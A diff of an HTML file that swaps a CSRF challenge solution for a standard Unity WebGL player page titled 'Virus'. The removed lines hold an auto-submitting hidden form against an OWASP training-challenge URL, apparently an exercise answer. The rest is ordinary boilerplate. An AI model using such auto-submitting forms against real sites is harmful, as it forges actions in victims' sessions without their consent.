@@ -1,9 +1,25 @@
-<h1>hhh</h1>
-<form name="csrfForm" action="http://owasp01.tic.heia-fr.ch/user/csrfchallengetwo/plusplus" method="GET">
-	 <input type="hidden" name="userId" value="e91e44407248a5a2431a4a9586128325cae05732" /> 
-<input type="submit"/>
-</form>
-<script>
-document.csrfForm.submit();
-</script>
-
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Unity WebGL Player | Virus</title>
+    <link rel="shortcut icon" href="TemplateData/favicon.ico">
+    <link rel="stylesheet" href="TemplateData/style.css">
+    <script src="TemplateData/UnityProgress.js"></script>
+    <script src="Build/UnityLoader.js"></script>
+    <script>
+      var unityInstance = UnityLoader.instantiate("unityContainer", "Build/Web.json", {onProgress: UnityProgress});
+    </script>
+  </head>
+  <body>
+    <div class="webgl-content">
+      <div id="unityContainer" style="width: 960px; height: 600px"></div>
+      <div class="footer">
+        <div class="webgl-logo"></div>
+        <div class="fullscreen" onclick="unityInstance.SetFullscreen(1)"></div>
+        <div class="title">Virus</div>
+      </div>
+    </div>
+  </body>
+</html>
